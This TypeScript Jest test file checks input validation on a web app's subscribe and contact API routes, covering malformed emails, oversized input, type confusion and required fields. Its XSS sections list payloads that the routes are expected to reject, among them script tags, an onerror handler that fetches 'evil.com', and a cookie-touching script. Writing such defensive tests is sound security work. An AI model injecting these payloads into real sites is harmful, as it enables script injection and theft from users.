/**
 * @jest-environment node
 *
 * API-layer input validation security tests.
 * Tests run in Node environment where Response/Request globals are available.
 */

import { POST as subscribePOST } from "@/app/api/subscribe/route";
import { POST as contactPOST } from "@/app/api/contact/route";

function subscribeReq(body: unknown) {
  return { json: () => Promise.resolve(body) } as unknown as Request;
}

function contactReq(body: unknown) {
  return { json: () => Promise.resolve(body) } as unknown as Request;
}

const validContact = {
  name: "Jane Doe",
  email: "jane@company.com",
  message: "I would like to discuss enterprise pricing options.",
};

// ─── Email format validation ─────────────────────────────────────────────────

describe("API – malformed email addresses are rejected", () => {
  const INVALID = [
    "plaintext",
    "missing@",
    "@nodomain.com",
    "two@@signs.com",
    "   ",
    "",
  ];

  INVALID.forEach((email) => {
    it(`subscribe rejects "${email}"`, async () => {
      expect((await subscribePOST(subscribeReq({ email }))).status).toBe(400);
    });
  });
});

// ─── XSS in subscribe ────────────────────────────────────────────────────────

describe("API – XSS payloads in subscribe are blocked", () => {
  const XSS = [
    '<script>alert(1)</script>',
    'javascript:alert(1)',
    '"onmouseover="alert(1)"',
    '"><svg/onload=alert(1)>',
  ];

  XSS.forEach((email) => {
    it(`blocks "${email.slice(0, 35)}"`, async () => {
      expect((await subscribePOST(subscribeReq({ email }))).status).toBe(400);
    });
  });
});

// ─── XSS in contact ──────────────────────────────────────────────────────────

describe("API – XSS payloads in contact form are blocked", () => {
  const XSS = [
    '<script>document.cookie="stolen"</script>',
    '<img src=x onerror=fetch("//evil.com")>',
    'javascript:eval(atob("YWxlcnQoMSk="))',
    '<iframe srcdoc="<script>alert(1)<\/script>"></iframe>',
  ];

  XSS.forEach((payload) => {
    it(`blocks XSS in message: "${payload.slice(0, 40)}"`, async () => {
      expect(
        (await contactPOST(contactReq({ ...validContact, message: payload }))).status
      ).toBe(400);
    });

    it(`blocks XSS in name: "${payload.slice(0, 40)}"`, async () => {
      expect(
        (await contactPOST(contactReq({ ...validContact, name: payload }))).status
      ).toBe(400);
    });
  });
});

// ─── Oversized input ─────────────────────────────────────────────────────────

describe("API – oversized input protection", () => {
  it("subscribe rejects email > 254 chars", async () => {
    expect(
      (await subscribePOST(subscribeReq({ email: "a".repeat(249) + "@x.com" }))).status // 255 chars
    ).toBe(400);
  });

  it("contact rejects name > 100 chars", async () => {
    expect(
      (await contactPOST(contactReq({ ...validContact, name: "A".repeat(101) }))).status
    ).toBe(400);
  });

  it("contact rejects message > 5000 chars", async () => {
    expect(
      (await contactPOST(contactReq({ ...validContact, message: "A".repeat(5001) }))).status
    ).toBe(400);
  });
});

// ─── Type confusion ───────────────────────────────────────────────────────────

describe("API – type confusion attacks are rejected", () => {
  it("subscribe rejects numeric email", async () => {
    expect((await subscribePOST(subscribeReq({ email: 42 }))).status).toBe(400);
  });

  it("subscribe rejects boolean email", async () => {
    expect((await subscribePOST(subscribeReq({ email: true }))).status).toBe(400);
  });

  it("subscribe rejects array as email", async () => {
    expect((await subscribePOST(subscribeReq({ email: ["a@b.com"] }))).status).toBe(400);
  });

  it("contact rejects numeric name", async () => {
    expect(
      (await contactPOST(contactReq({ ...validContact, name: 999 }))).status
    ).toBe(400);
  });

  it("contact rejects null message", async () => {
    expect(
      (await contactPOST(contactReq({ ...validContact, message: null }))).status
    ).toBe(400);
  });
});

// ─── Required fields ─────────────────────────────────────────────────────────

describe("API – required field enforcement", () => {
  it("subscribe returns 400 with empty body", async () => {
    expect((await subscribePOST(subscribeReq({}))).status).toBe(400);
  });

  it("contact returns 400 with empty body", async () => {
    expect((await contactPOST(contactReq({}))).status).toBe(400);
  });

  (["name", "email", "message"] as const).forEach((field) => {
    it(`contact returns 400 when ${field} is missing`, async () => {
      const body = { ...validContact };
      delete (body as Record<string, unknown>)[field];
      expect((await contactPOST(contactReq(body))).status).toBe(400);
    });
  });
});
